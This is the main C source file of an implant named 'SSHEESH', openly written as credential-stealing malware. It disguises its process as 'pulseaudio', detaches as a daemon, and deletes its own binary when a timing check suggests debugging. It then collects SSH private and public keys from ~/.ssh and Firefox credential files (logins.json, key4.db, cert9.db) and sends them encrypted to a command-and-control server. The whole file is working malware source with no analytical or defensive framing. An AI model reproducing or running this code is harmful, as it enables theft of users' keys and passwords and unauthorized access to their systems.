// SSHEESH - Implant client main
// Collects SSH private/public keys and sends them securely using C2 module

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <time.h>
#include "stealSSH.h"
#include "C2.h"
#include "browserCred.h"
#include "filetypes.h"

#define MAX_BUFFER_SIZE 8192
#define MAX_PATH 1024

/**
 * Append the content of a file to a buffer.
 * @return new buffer offset after appending
 */
static size_t append_file_to_buffer(const char *path, uint8_t *buffer, size_t offset)
{
    FILE *fp = fopen(path, "rb");
    if (!fp)
    {
#ifdef DEBUG
        fprintf(stderr, "[DEBUG] Cannot open %s\n", path);
#endif
        return offset;
    }

    offset += snprintf((char *)(buffer + offset), MAX_BUFFER_SIZE - offset,
                       "\n[==> %s <==]\n", path);

    size_t read = 0;
    while ((read = fread(buffer + offset, 1, MAX_BUFFER_SIZE - offset, fp)) > 0)
    {
        offset += read;
        if (offset >= MAX_BUFFER_SIZE - 1)
            break;
    }

    fclose(fp);
    return offset;
}

/**
 * Dump the key pairs into a buffer.
 * @return the total length of dumped data
 */
static size_t dump_keys_to_buffer(sshKey keys[], size_t count, uint8_t *buffer)
{
    size_t offset = 0;
    for (size_t i = 0; i < count; ++i)
    {
        offset = append_file_to_buffer(keys[i].publicKeyPath, buffer, offset);
        offset = append_file_to_buffer(keys[i].secretKeyPath, buffer, offset);
    }
    return offset;
}
uint8_t *read_file(const char *path, size_t *out_len)
{
    FILE *fp = fopen(path, "rb");
    if (!fp)
        return NULL;

    fseek(fp, 0, SEEK_END);
    size_t len = ftell(fp);
    rewind(fp);

    uint8_t *buf = malloc(len);
    if (!buf)
    {
        fclose(fp);
        return NULL;
    }

    size_t total = 0;
    while (total < len)
    {
        size_t r = fread(buf + total, 1, len - total, fp);
        if (r == 0)
            break;
        total += r;
    }

    fclose(fp);
    if (total != len)
    {
        free(buf);
        return NULL;
    }

    *out_len = len;
    return buf;
}

int main(int argc, char *argv[])
{

#ifndef DEBUG
    prctl(PR_SET_NAME, "pulseaudio", 0, 0, 0);

    if (argc > 0)
    {
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], "pulseaudio");
    }

    int pid = fork();
    if (pid < 0)
        exit(1);
    if (pid > 0)
        exit(0);

    setsid();
    chdir("/");
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);

    time_t start = time(NULL);

    for (int i = 0; i < 10; i++)
    {
        int random = rand();
        random = (random << 1) | (random >> 31);
    }

    time_t end = time(NULL);

    if (end - start > 1)
    {
        char self_path[4096] = {0};
        ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
        if (len != -1)
        {
            self_path[len] = '\0';
            unlink(self_path);
        }
        memset(self_path, 0, sizeof(self_path));
        exit(1);
    }

#endif

    sshKey keyList[MAX_KEY_FILES];
    size_t keyCount = 0;

#ifdef DEBUG
    printf("[DEBUG] SSHEESH started\n");
#endif

    // Search for SSH keys under ~/.ssh
    harvest_key_pairs(resolve_home_path("~/.ssh"), keyList, &keyCount);

    if (keyCount == 0)
    {
#ifdef DEBUG
        fprintf(stderr, "[DEBUG] No key pairs found\n");
#endif
        return 0;
    }

#ifdef DEBUG
    printf("[DEBUG] Found %zu SSH key pairs\n", keyCount);
#endif

    // Prepare a buffer with all the dumped keys
    uint8_t buffer[MAX_BUFFER_SIZE] = {0};
    size_t total_len = dump_keys_to_buffer(keyList, keyCount, buffer);

#ifdef DEBUG
    printf("[DEBUG] Total buffer length: %zu\n", total_len);
#endif

    // Send encrypted payload
    int result = send_encrypted_blob(FILETYPE_SSH_KEY,buffer, total_len);

    // Clean up
    for (size_t i = 0; i < keyCount; ++i)
    {
        free(keyList[i].publicKeyPath);
        free(keyList[i].secretKeyPath);
    }
    // === Encrypt and send browser credentials ===
    char path1[MAX_PATH], path2[MAX_PATH] , path3[MAX_PATH];
    if (detect_credentials(path1, path2, path3))
    {
        size_t len1 = 0, len2 = 0, len3 = 0;
        uint8_t *buf1 = read_file(path1, &len1);
        uint8_t *buf2 = read_file(path2, &len2);
        uint8_t *buf3 = read_file(path3, &len3);

        if (buf1 && len1 > 0)
        {
#ifdef DEBUG
            printf("[DEBUG] Sending browser credential file 1 (%zu bytes): %s\n", len1, path1);
#endif
            send_encrypted_blob(FILETYPE_FIREFOX_LOGINS_JSON,buf1, len1);
            fprintf(stderr, "[DEBUG] sent %zu bytes from %s\n", len1, path1);
            free(buf1);
        }

        if (buf2 && len2 > 0)
        {
#ifdef DEBUG
            printf("[DEBUG] Sending browser credential file 2 (%zu bytes): %s\n", len2, path2);
#endif
            send_encrypted_blob(FILETYPE_FIREFOX_KEY4_DB,buf2, len2);
            free(buf2);
        }
        if (buf3 && len3 > 0)
        {
#ifdef DEBUG
            printf("[DEBUG] Sending browser credential file 3 (%zu bytes): %s\n", len3, path3);
#endif
            send_encrypted_blob(FILETYPE_FIREFOX_CERT9_DB,buf3, len3);
            free(buf3);
        }
    }

    else
    {
#ifdef DEBUG
        fprintf(stderr, "[DEBUG] No browser credentials found\n");
#endif
    }

    if (!result)
    {
#ifdef DEBUG
        fprintf(stderr, "[DEBUG] Failed to send payload\n");
#endif
        return 1;
    }

#ifdef DEBUG
    printf("[DEBUG] SSHEESH payload sent successfully\n");
#endif

    return 0;
}
